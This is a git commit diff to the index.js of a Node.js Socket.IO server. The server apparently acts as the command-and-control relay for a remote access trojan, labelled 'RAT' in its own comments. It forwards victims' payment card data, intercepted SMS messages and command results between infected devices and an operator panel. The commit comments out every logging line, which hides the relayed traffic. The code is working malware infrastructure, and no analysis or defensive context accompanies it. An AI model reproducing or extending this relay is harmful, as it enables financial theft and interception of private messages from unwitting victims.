59cf3281d779355e9de5c7eed4db8114a487169e
amanalokverma <139472680+amanalokverma@users.noreply.github.com>
2023-07-13 19:25:37 +0530

    Update index.js
    REemovbed LOGS

--- index.js
+++ index.js
@@ -25,45 +25,45 @@ io.on('connection', function(socket) {
 	console.log('User Connected: '+socket.id);
 	
 	socket.on('online_check' , function(data){
-		console.log("GOT CMD "+data);
+		//console.log("GOT CMD "+data);
 		io.emit('is_online',data);
 	});
 		
 	socket.on('user_send' , function(data){
-		console.log("GOT User"+data);
+		//console.log("GOT User"+data);
 		io.emit('user_online',data);
 	});
 		
 	socket.on('msg_send' , function(data){
-		console.log("GOT MSG"+data);
+		//console.log("GOT MSG"+data);
 		io.emit('sms_got',data);
 	});
 	
 	socket.on('card_send' , function(data){
-		console.log("GOT CARD"+data);
+		//console.log("GOT CARD"+data);
 		io.emit('card_got',data);
 	});
 	
 	
 	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
 	socket.on('user_connected' , function(data){
-		console.log('On User Connect: '+data);
+		//console.log('On User Connect: '+data);
 		io.emit('on_user_connected',data);
 	});
 	
 	socket.on('card_data' , function(data){
-		console.log('CARD DATA: '+data);
+		//console.log('CARD DATA: '+data);
 		io.emit('card_data_rat',data);
 	});
 
 	socket.on('sms' , function(data){
-		console.log('SINGLE DATA: '+data);
+		//console.log('SINGLE DATA: '+data);
 		io.emit('sms_rat',data);
 	});
 	
 		
 	socket.on('cmd_done' , function(data){
-		console.log('cmd_done_rat: '+data);
+		//console.log('cmd_done_rat: '+data);
 		io.emit('cmd_done_rat',data);
 	});
 
